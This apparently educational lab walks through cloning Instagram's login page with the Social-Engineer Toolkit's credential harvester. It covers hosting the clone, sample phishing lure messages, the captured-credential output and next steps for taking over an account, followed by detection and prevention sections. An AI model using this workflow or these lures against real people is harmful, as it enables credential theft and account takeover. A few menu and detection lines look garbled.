# Instagram Phishing Attack: Step-by-Step Walkthrough

**Lab Name:** Credential Harvester Phishing Attack via Website Cloning  
**Attack Type:** Social Engineering Toolkit (SET) - Website Attack Vector  
**Target:** Instagram login credentials  
**Environment:** Kali Linux (isolated lab network)  
**Duration:** 30-45 minutes  
**Status:** Educational purposes only  

---

## 🎯 Learning Objectives

After completing this lab, you will understand:

✅ How attackers use SET to clone websites  
✅ How credential harvesting works in practice  
✅ Why users fall for phishing attacks  
✅ Network-level attack execution  
✅ How to detect and prevent this attack  

---

## ⚠️ IMPORTANT: Ethical Requirements

- ✅ This lab must be conducted **in isolated lab environment ONLY**
- ✅ Use **test victims** (not real users) or machines you control
- ✅ Never conduct unauthorized phishing against real users
- ✅ This is for **defensive understanding ONLY**
- ✅ Violations may result in **legal consequences**

---

## 📋 Prerequisites

### Software Required
- Kali Linux (virtual machine recommended)
- Social Engineering Toolkit (SET) — pre-installed on Kali
- Web browser (Firefox, Chromium)
- Terminal/Command line comfort
- Network knowledge (IP addresses, local network)

### Knowledge Required
- Basic Linux command line
- Understanding of HTTP/HTTPS
- Web browsers and login pages
- IP addressing

### Hardware/Network
- Virtual machine with network access
- Isolated lab network OR NAT mode networking
- Second machine/VM to act as "victim" (optional, can simulate)

---

## 🔧 Phase 1: Environment Setup

### Step 1: Start Kali Linux
```bash
# Boot Kali Linux VM
# (We assume Kali is already running)
```

### Step 2: Verify SET Installation
```bash
# Check if SET is installed
which setoolkit

# If not installed, install it:
sudo apt-get update
sudo apt-get install set

# Verify version
setoolkit --version
```

### Step 3: Identify Network Information
```bash
# Get your local IP address (attacker machine)
ifconfig

# Example output:
# eth0: inet 192.168.1.100

# This is the IP you'll use to host the fake page
# Write it down: _______________
```

### Step 4: Prepare Lab Environment
```bash
# Create working directory
mkdir -p ~/phishing-lab/instagram
cd ~/phishing-lab/instagram

# Check Apache web server (may need to start)
sudo service apache2 status
# If stopped: sudo service apache2 start
```

---

## 🎬 Phase 2: Launch Social Engineering Toolkit (SET)

### Step 5: Start SET
```bash
# Launch SET with sudo (required for network operations)
sudo setoolkit

# You should see the welcome screen:
"""
        [*]  The Social-Engineer Toolkit (SET)
        [*]  Version: 8.x.x
        ...
        Welcome to the Social-Engineer Toolkit (SET).
        The one stop shop for professional se penetration testing.
        
        [*] The Social-Engineer Toolkit is written by David Kennedy (ReL1K)
        [*] https://www.trustedsec.com
"""
```

### Step 6: Navigate to Website Attack Vectors
```bash
# Main menu - Select option 1: Social-Engineering Attacks
# (or the option for SE attacks)

# Then select:
# 2) Website Attack Vectors
# (This allows you to clone/host websites for phishing)
```

**Menu Flow:**
```
Main Menu
  ↓
1) Social-Engineering Attacks
  ↓
2) Website Attack Vectors
  ↓
[You are here - ready to select attack method]
```

---

## 🌐 Phase 3: Website Cloning & Credential Harvesting

### Step 7: Select Credential Harvester Attack
```
SET Website Attack Vectors Menu
  ↓
Select attack method:
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
3) Credential Harvester Attack Method     ← SELECT THIS
4) Tabnabbing Attack Method
5) Web Jacking Attack Method
6) HTA Attack Method
7) HTA Attack Method

# Enter: 3 (Credential Harvester Attack Method)
```

**What this does:** Allows you to clone a legitimate website and capture credentials when users submit a login form.

### Step 8: Choose Website Source
```
How would you like to start this SET attack?

1) Web Templates
   (Use a pre-built template like Facebook, Gmail, etc.)
2) Site Cloner
   (Clone an actual website's HTML)
3) Custom Import
   (Import your own HTML file)

# Select: 2 (Site Cloner)
# This lets us clone the real Instagram login page
```

**Why Site Cloner?**
- Downloads the actual HTML/CSS/JavaScript from Instagram
- Creates a near-perfect replica
- Makes it more convincing to victims

### Step 9: Provide Target Website
```
Enter the URL to clone:
> https://www.instagram.com

[SET will download and clone the page]

Setting up the credential harvester...
Please wait while the site is being cloned...

[Progress]
✓ HTML downloaded
✓ CSS files retrieved
✓ JavaScript processed
✓ Images cloned
```

---

## 🔗 Phase 4: Configure & Host Attack

### Step 10: Set the Post-Back IP Address
```
[IMPORTANT] READ THIS CAREFULLY

Enter the IP address for the POST back
(This is where captured credentials are sent)

Enter IP address: 192.168.1.100
(This is YOUR attacker machine IP)

# If hosting on same machine:
Enter IP address: 192.168.1.100

# Note: Later, we'll see captured credentials displayed here
```

### Step 11: Start the Malicious Server
```
Starting Apache web server...
Listening for credentials on: 192.168.1.100

[+] Credential Harvester is ready
[+] Waiting for credentials to be posted to:
    http://192.168.1.100

[+] Site is being hosted here:
    http://192.168.1.100/

[+] Press <CTRL+C> to exit and capture any credentials
```

**What's happening:**
- Apache web server is running on your machine
- The fake Instagram login page is hosted at `http://192.168.1.100`
- Any credentials submitted will be captured

---

## 👤 Phase 5: Social Engineering (Getting Victims to Visit)

### Step 12: Social Engineering - Crafting the Message
```
Now you need to trick users into visiting your fake page.
Common methods:

1) PHISHING EMAIL
   Subject: "Suspicious Activity on Your Account"
   "We noticed unusual activity on your Instagram account.
    Please verify your identity: [LINK]"

2) SOCIAL MEDIA DM
   "Hi! Your photo got flagged. Click here to appeal: [LINK]"

3) TEXT MESSAGE
   "Your Instagram password expires. Reset: [LINK]"

4) INSTANT MESSAGE
   (WhatsApp, Discord, etc.)
   "Hey, check out this video of you: [LINK]"

Attack vector: Send link to http://192.168.1.100
```

### Step 13: Send Attack Link
```
Victim receives message with link:
"Your account was compromised. Verify: http://192.168.1.100"

Victim clicks link ↓

Browser displays the FAKE Instagram login page ↓

Page looks IDENTICAL to real Instagram ↓

Victim enters username and password ↓
```

---

## 📥 Phase 6: Credential Capture

### Step 14: Monitor Credential Capture in SET
```
[On your attacker machine - still in SET terminal]

[Waiting for credentials...]

[+] Incoming connection!
[+] New connection from: 192.168.1.101 (victim IP)

[+] POST data received:
    username: victim_user@email.com
    password: VictimPassword123!

[+] Credentials logged to: /tmp/setoolkit/credentials.txt

[Credentials captured and displayed in terminal]
```

### Step 15: Examine Captured Data
```bash
# After exiting SET (Ctrl+C), view captured credentials:
cat /tmp/setoolkit/credentials.txt

# Output:
"""
[*] Harvested Credentials:
[*] =====================================
[*] Username/Email: victim_user@email.com
[*] Password: VictimPassword123!
[*] IP Address: 192.168.1.101
[*] Timestamp: 2024-06-24 14:32:15
"""
```

---

## 🔍 Phase 7: Post-Exploitation (What Attackers Do Next)

### Step 16: Use Captured Credentials
```
Attacker now has victim's credentials:
  Email: victim_user@email.com
  Password: VictimPassword123!

Next steps (real attack):

1) Log into Instagram account
   - Access victim's messages
   - View follower list
   - Steal personal photos
   
2) Spread malware
   - Message followers with malicious links
   - Post compromised content
   
3) Social engineering
   - Use account to impersonate victim
   - Request money/information from friends
   
4) Lateral movement
   - Use same credentials on other services
   - Email, Facebook, banking, etc.
   
5) Account hijacking
   - Change password
   - Disable 2FA
   - Lock out real owner
```

---

## 🛡️ Phase 8: How to Detect This Attack

### Detection Method 1: Email Analysis
```
Phishing Email Red Flags:

1) Suspicious Sender Address
   - From: support-verify-instagram.com (NOT @instagram.com)
   - Grammar/spelling errors
   
2) Suspicious Link
   - URL shows: http://192.168.1.100 (not instagram.com)
   - "Hover" to see real URL before clicking
   - Short URLs hide destination
   
3) Unusual Request
   - Instagram never asks for password via email
   - Legitimate companies won't ask credentials by link
   
4) Urgency Language
   - "Act now"
   - "Account will be disabled"
   - "Verify immediately"
```

### Detection Method 2: User Behavior
```
If victim was suspicious, they could check:

1) Type the official URL manually
   instagram.com (NOT via link)
   
2) Check for HTTPS and valid certificate
   Fake page likely has: (no padlock)
   Real Instagram has: ✓ Valid certificate
   
3) Check email source
   Official emails come from @instagram.com
   Phishing may come from @instagram-verify.com
   
4) Check browser URL bar
   Fake: http://192.168.1.100
   Real: https://www.instagram.com
```

### Detection Method 3: Network-Level
```bash
# SOC analyst perspective - how to detect this attack:

# 1) Monitor for suspicious web hosting
# Alert on: users visiting IP addresses directly
# Alert on: requests to known attacker IPs

# 2) Email gateway analysis
# Scan for: unclicked links in phishing emails
# Scan for: sender address spoofing

# 3) DNS analysis
# Alert on: newly registered domains (whois check)
# Alert on: domains registered 12.34.com → resembles instagram

# 4) Network IDS/IPS
# Alert on: POST requests with username/password to non-standard IPs
# Alert on: Unencrypted credentials in HTTP

# 5) Endpoint detection
# Alert on: credential submission to unusual IPs
# Log: All browser history and visited URLs
```

---

## 🛡️ Prevention Strategies (Key Takeaways)

### Layer 1: Technical Controls
```
✓ HTTPS enforcement (prevents traffic interception)
✓ HSTS headers (forces HTTPS)
✓ SPF/DKIM/DMARC (email authentication)
✓ Email filtering (blocks phishing emails)
✓ MFA/2FA (limits impact of stolen credentials)
✓ DNS filtering (blocks malicious domains)
✓ Browser security (certificate warnings)
```

### Layer 2: User Practices
```
✓ Verify sender email address (not display name)
✓ Hover over links to see real URL
✓ Never click email links for login - type URL manually
✓ Check for HTTPS and valid certificate
✓ Use password manager (avoids entering on fake sites)
✓ Enable 2FA on important accounts
✓ Report suspicious emails
```

### Layer 3: Organizational
```
✓ Security awareness training
✓ Phishing simulation exercises
✓ Clear incident reporting process
✓ Email security policies
✓ Identity verification procedures
✓ Credential management policies
```

---

## 📊 Why This Attack Works

### Psychological Factors
```
1) AUTHORITY
   "Instagram" = trusted company
   User assumes it's legitimate
   
2) URGENCY
   "Verify now" or "Account disabled"
   Victim panics, doesn't think clearly
   
3) FAMILIARITY
   Page looks IDENTICAL to real Instagram
   User doesn't question legitimacy
   
4) TRUST
   User has no reason to suspect email/link
   Credentials entered without hesitation
```

### Technical Factors
```
1) No HTTPS verification
   User doesn't check certificate
   Doesn't notice "Not Secure" warning
   
2) HTTP vs HTTPS
   Attackers use HTTP (no encryption)
   Real Instagram uses HTTPS
   
3) IP address vs domain
   Victim visits IP address instead of instagram.com
   Victim doesn't notice difference
   
4) Form submission unencrypted
   Username/password sent in plaintext
   Can be intercepted on network
```

---

## 💡 Lessons Learned

### For Attackers
1. **Website cloning is easy** — SET does it automatically
2. **Users trust appearance** — Professional-looking pages work
3. **Social engineering is the weak link** — Technology alone isn't enough
4. **Credential harvesting is simple** — Just capture form submissions
5. **Victims don't check URLs** — Most won't verify the link

### For Defenders
1. **User training is critical** — Technical controls fail without awareness
2. **MFA is essential** — Stolen password alone can't compromise accounts
3. **Email filtering helps** — But isn't foolproof
4. **URL verification is easy** — Users just need to hover and check
5. **HTTPS matters** — Shows certificate validity

---

## 🔗 Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────┐
│ PHISHING ATTACK FLOW                                         │
└─────────────────────────────────────────────────────────────┘

Reconnaissance Phase
    ↓
Target Selection
    ↓
Website Cloning (using SET)
    ↓
Hosting on Attacker's Machine
    ↓
Social Engineering (phishing email/DM)
    ↓
User Receives Message with Suspicious Link
    ↓
User Clicks Link (Victim's first mistake)
    ↓
Fake Instagram Login Page Displayed
    ↓
User Enters Credentials (Victim's second mistake)
    ↓
Credentials Submitted to Attacker
    ↓
SET Captures Credentials
    ↓
Attacker Has Access to Account
    ↓
Account Takeover / Data Theft / Lateral Movement
```

---

## ✅ Checklist: Things That Made This Attack Work

- [ ] Professional-looking clone page
- [ ] Legitimate social engineering pretext
- [ ] User trusted the sender
- [ ] User didn't verify the URL
- [ ] User didn't notice HTTP vs HTTPS
- [ ] User entered credentials without suspicion
- [ ] No 2FA protection
- [ ] No password manager alert
- [ ] Network traffic wasn't monitored
- [ ] Email wasn't filtered
- [ ] Employee wasn't trained

---

## 🛡️ Checklist: Defenses That Could Have Prevented This

- [ ] MFA enabled (blocks account takeover even with password)
- [ ] Email filtering (blocks phishing emails)
- [ ] User training (recognizes phishing attempts)
- [ ] Browser security (HTTPS certificate warnings)
- [ ] Password manager (avoids entering on fake sites)
- [ ] DNS filtering (blocks malicious domains)
- [ ] Network monitoring (detects unencrypted credentials)
- [ ] Suspicious email reporting (removes phishing emails)
- [ ] Identity verification (confirms user before reset)
- [ ] DMARC/SPF (prevents email spoofing)

---

## 📚 Lab Exercises

After completing this walkthrough:

1. **Repeat the attack** — Practice with SET
2. **Try different websites** — Clone Facebook, LinkedIn, Gmail
3. **Improve social engineering** — Write convincing phishing emails
4. **Detect the attack** — Set up Wireshark to capture traffic
5. **Improve defenses** — Test MFA, email filtering, user training

---

## 🚫 What NOT to Do

- ❌ Conduct this attack against real users
- ❌ Use captured credentials without permission
- ❌ Access real accounts (even for testing)
- ❌ Share credentials with others
- ❌ Conduct this outside a lab environment
- ❌ Test without written authorization
- ❌ Violate any laws or regulations

---

## 📖 Further Reading

- **MITRE ATT&CK:** Phishing - https://attack.mitre.org/techniques/T1566/
- **OWASP:** Phishing - https://owasp.org/www-community/attacks/phishing
- **NIST:** Phishing Prevention - https://pages.nist.gov/
- **SET Documentation:** https://www.trustedsec.com/tools/social-engineer-toolkit/

---

**Lab Completed!** You now understand how phishing attacks work at a technical level.

**Next:** Learn detection, response, and prevention in `02-prevention-controls/` and `04-detection-response/`

